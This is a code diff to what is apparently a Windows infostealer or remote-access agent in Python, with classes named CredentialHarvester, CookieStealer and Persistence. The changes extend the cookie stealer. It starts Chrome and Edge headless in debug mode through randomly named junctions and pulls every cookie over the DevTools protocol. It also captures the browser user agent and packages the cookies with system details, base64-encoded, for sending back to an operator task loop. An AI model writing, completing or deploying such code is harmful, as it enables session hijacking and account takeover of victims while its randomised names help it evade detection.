@@ -1,6 +1,7 @@
 import sys
 import subprocess
 import platform
+import random
 from datetime import datetime, timedelta
 
 def install_module(module_name, pip_name=None):
@@ -170,12 +171,14 @@ class CredentialHarvester:
 # Cookie Stealer
 # ======================
 class CookieStealer:
-    def __init__(self, logger=None):
+    def __init__(self, logger=None, config=None):
         self.logger = logger or self._create_default_logger()
+        self.config = config
         self.chrome_debug_port = 9222
         self.edge_debug_port = 9223
         self.timeout = 10
         self.unique_domains = set()
+        self.used_junction_names = set()
         
         # Browser configurations
         self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
@@ -225,36 +228,56 @@ class CookieStealer:
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
         """Process Chrome/Edge cookies"""
+        proc = None
+        junction_paths = []
         try:
             self._log('info', f"Processing {{browser_name}} cookies")
-            
+
             # Start browser in debug mode
-            proc = self._start_browser_debug(browser_path, port, user_data_dir)
+            proc, junction_paths = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
                 return None
 
             # Wait for browser to start
             time.sleep(5)
-            
+
             # Get cookies via debug protocol
-            cookies = self._get_cookies_via_debug(port)
-            
+            debug_result = self._get_cookies_via_debug(port)
+
             # Clean up browser process
             proc.terminate()
             proc.wait()
 
-            if not cookies:
+            if not debug_result or not isinstance(debug_result, dict) or not debug_result.get('cookies'):
                 return None
+
+            cookies = debug_result['cookies']
+            browser_user_agent = debug_result.get('browser_user_agent', 'Unknown')
 
             # Transform cookies to standard format
             transformed = self._transform_cookies(cookies)
-            
+
             # Package cookies for transmission
-            return self._package_cookies(transformed, browser_name)
+            return self._package_cookies(transformed, browser_name, browser_user_agent)
 
         except Exception as e:
             self._log('error', f"{{browser_name}} cookie processing failed: {{str(e)}}")
             return None
+        finally:
+            # Forcefully remove junctions after use
+            for junction_path in junction_paths:
+                try:
+                    if os.path.exists(junction_path):
+                        if os.path.isdir(junction_path):
+                            subprocess.run(['cmd', '/c', 'rmdir', junction_path], check=True)
+                        else:
+                            os.remove(junction_path)
+                    self._log('info', f"Cleaned up junction: {{junction_path}}")
+                    # Remove from used names set after cleanup
+                    junction_name = os.path.basename(junction_path)
+                    self.used_junction_names.discard(junction_name)
+                except Exception as e:
+                    self._log('error', f"Failed to clean up junction {{junction_path}}: {{str(e)}}")
 
     def _process_firefox_cookies(self):
         """Process Firefox cookies"""
@@ -324,10 +347,28 @@ class CookieStealer:
         return transformed
 
     def _create_junctions(self):
-        """Create junctions for Chrome and Edge user data directories"""
+        """Create junctions for Chrome and Edge user data directories with random names"""
         temp_dir = os.getenv('TEMP')
-        chrome_junction = os.path.join(temp_dir, 'g')
-        edge_junction = os.path.join(temp_dir, 'e')
+        # Generate unique random 8-character alphabetic names
+        chrome_junction_name = None
+        edge_junction_name = None
+
+        # Generate unique name for Chrome junction
+        while True:
+            chrome_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
+            if chrome_junction_name not in self.used_junction_names:
+                self.used_junction_names.add(chrome_junction_name)
+                break
+
+        # Generate unique name for Edge junction
+        while True:
+            edge_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
+            if edge_junction_name not in self.used_junction_names:
+                self.used_junction_names.add(edge_junction_name)
+                break
+
+        chrome_junction = os.path.join(temp_dir, chrome_junction_name)
+        edge_junction = os.path.join(temp_dir, edge_junction_name)
 
         # Remove existing junctions if they exist
         for junction in [chrome_junction, edge_junction]:
@@ -362,6 +403,7 @@ class CookieStealer:
 
             # Create junctions and use them if user_data_dir matches Chrome or Edge paths
             chrome_junction, edge_junction = self._create_junctions()
+            junction_paths = [chrome_junction, edge_junction]  # Track junctions for cleanup
             if user_data_dir == self.CHROME_USER_DATA_DIR:
                 user_data_dir = chrome_junction
             elif user_data_dir == self.EDGE_USER_DATA_DIR:
@@ -376,12 +418,13 @@ class CookieStealer:
                 '--headless',
                 f'--user-data-dir={{user_data_dir}}'
             ]
-            return subprocess.Popen(command, 
+            proc = subprocess.Popen(command,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
+            return proc, junction_paths
         except Exception as e:
             self._log('error', f"Failed to start browser: {{str(e)}}")
-            return None
+            return None, []
 
     def _kill_browser(self, process_name):
         """Kill browser process if running"""
@@ -392,27 +435,74 @@ class CookieStealer:
             pass
 
     def _get_cookies_via_debug(self, port):
-        import websocket 
-        """Get cookies using Chrome DevTools Protocol"""
+        import websocket
+        """Get cookies using Chrome DevTools Protocol with proper Network domain enablement"""
         try:
             debug_url = f'http://localhost:{{port}}/json'
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
-            
+
             data = response.json()
             if not data:
                 return []
-                
+
             ws_url = data[0]['webSocketDebuggerUrl']
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
-            
+
+            # Enable Network domain (required for cookie operations)
             ws.send(json.dumps({{
                 'id': 1,
+                'method': 'Network.enable'
+            }}))
+
+            # Wait for Network.enable response
+            network_response = json.loads(ws.recv())
+            if 'error' in network_response:
+                self._log('error', f"Network.enable failed: {{network_response['error']}}")
+                return []
+
+            # Get browser User-Agent
+            ws.send(json.dumps({{
+                'id': 2,
+                'method': 'Runtime.evaluate',
+                'params': {{
+                    'expression': 'navigator.userAgent',
+                    'returnByValue': True
+                }}
+            }}))
+
+            ua_response = json.loads(ws.recv())
+            browser_user_agent = 'Unknown'
+            if 'result' in ua_response and 'result' in ua_response['result']:
+                full_ua = ua_response['result']['result'].get('value', 'Unknown')
+                # Extract browser-specific part and remove Headless
+                if 'Chrome/' in full_ua:
+                    # For Chrome/Edge, extract from Chrome/ onwards
+                    chrome_part = full_ua.split('Chrome/')[1]
+                    browser_user_agent = f"Chrome/{{chrome_part}}".replace('Headless', '').strip()
+                elif 'Firefox/' in full_ua:
+                    # For Firefox, extract from Firefox/ onwards
+                    firefox_part = full_ua.split('Firefox/')[1].split(' ')[0]
+                    browser_user_agent = f"Firefox/{{firefox_part}}"
+                else:
+                    browser_user_agent = full_ua.replace('Headless', '').strip()
+
+            # Now get all cookies
+            ws.send(json.dumps({{
+                'id': 3,
                 'method': 'Network.getAllCookies'
             }}))
-            
-            response = json.loads(ws.recv())
-            return response['result']['cookies']
+
+            cookies_response = json.loads(ws.recv())
+            if 'result' in cookies_response and 'cookies' in cookies_response['result']:
+                # Return both cookies and browser user agent
+                return {{
+                    'cookies': cookies_response['result']['cookies'],
+                    'browser_user_agent': browser_user_agent
+                }}
+            else:
+                self._log('error', f"Unexpected cookies response format: {{cookies_response}}")
+                return []
         except Exception as e:
             self._log('error', f"Debug protocol error: {{str(e)}}")
             return []
@@ -537,7 +627,7 @@ class CookieStealer:
                 'username': 'Unknown',
                 'computer_name': 'Unknown',
                 'windows_version': 'Unknown',
-                'user_agent': 'Unknown'
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
             }}
 
     def _extract_unique_domains(self, cookies):
@@ -549,34 +639,42 @@ class CookieStealer:
                 unique_domains.add(domain)
         return list(unique_domains)
 
-    def _package_cookies(self, cookies, browser_name):
+    def _package_cookies(self, cookies, browser_name, browser_user_agent=None):
         """Package cookies into base64 encoded JSON with system info"""
         try:
             if not cookies:
                 return None
-                
+
             # Extract unique domains
             unique_domains = self._extract_unique_domains(cookies)
             self.unique_domains.update(unique_domains)
-            
+
             # Get system info
             system_info = self._get_system_info()
-            
-            # Create temporary file
-            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+
+            # Override user_agent with browser's user agent if provided
+            if browser_user_agent and browser_user_agent != 'Unknown':
+                system_info['user_agent'] = browser_user_agent
+
+            # Create temporary file with random folder name
+            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer_' + str(random.randint(1000,9999)))
             os.makedirs(temp_dir, exist_ok=True)
-            
+
             temp_file = os.path.join(temp_dir, f'{{browser_name}}_cookies.json')
             with open(temp_file, 'w') as f:
                 json.dump(cookies, f, indent=4)
-            
+
             # Read file content
             with open(temp_file, 'rb') as f:
                 cookie_data = f.read()
-            
+
             # Clean up
             os.remove(temp_file)
-            
+            try:
+                os.rmdir(temp_dir)
+            except:
+                pass
+
             return {{
                 'browser': browser_name,
                 'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
@@ -972,7 +1070,7 @@ class Persistence:
                 '</Task>'
             ]
             
-            xml_path = os.path.join(os.getenv('TEMP'), f'task_{{random.randint(1000,9999)}}.xml')
+            xml_path = os.path.join(os.getenv('TEMP'), 'task_' + str(random.randint(1000,9999)) + '.xml')
             logger.debug(f"Writing task XML to {{xml_path}}")
             
             with open(xml_path, 'w') as f:
@@ -2017,7 +2115,7 @@ class Agent:
             elif task_type == "steal_cookies":
                 try:
                     self._log_info("Starting cookie stealing task")
-                    stealer = CookieStealer(logger=self.logger)
+                    stealer = CookieStealer(logger=self.logger, config=self.config)
                     results = stealer.steal_cookies()
                     
                     if not results:
